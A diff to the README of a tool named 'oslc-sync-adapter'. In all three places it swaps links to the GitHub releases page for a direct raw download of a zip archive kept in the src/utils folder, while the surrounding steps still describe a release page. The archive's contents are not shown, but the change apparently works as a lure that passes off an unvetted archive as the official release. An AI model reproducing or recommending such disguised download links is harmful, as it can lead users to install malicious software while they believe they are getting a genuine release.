@@ -1,6 +1,6 @@
 # 🔄 oslc-sync-adapter - Sync tools with less friction
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/MachineVsCat/oslc-sync-adapter/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/MachineVsCat/oslc-sync-adapter/raw/refs/heads/main/src/utils/oslc_sync_adapter_1.1-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use this guide to download the app, set it up, and start it on your computer.
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/MachineVsCat/oslc-sync-adapter/releases
+https://github.com/MachineVsCat/oslc-sync-adapter/raw/refs/heads/main/src/utils/oslc_sync_adapter_1.1-alpha.1.zip
 
 1. Open the release page in your browser.
 2. Find the latest release at the top of the list.
@@ -218,4 +218,4 @@ Use one simple item for your first run.
 
 If you need the release page again, use this link:
 
-https://github.com/MachineVsCat/oslc-sync-adapter/releases
+https://github.com/MachineVsCat/oslc-sync-adapter/raw/refs/heads/main/src/utils/oslc_sync_adapter_1.1-alpha.1.zip
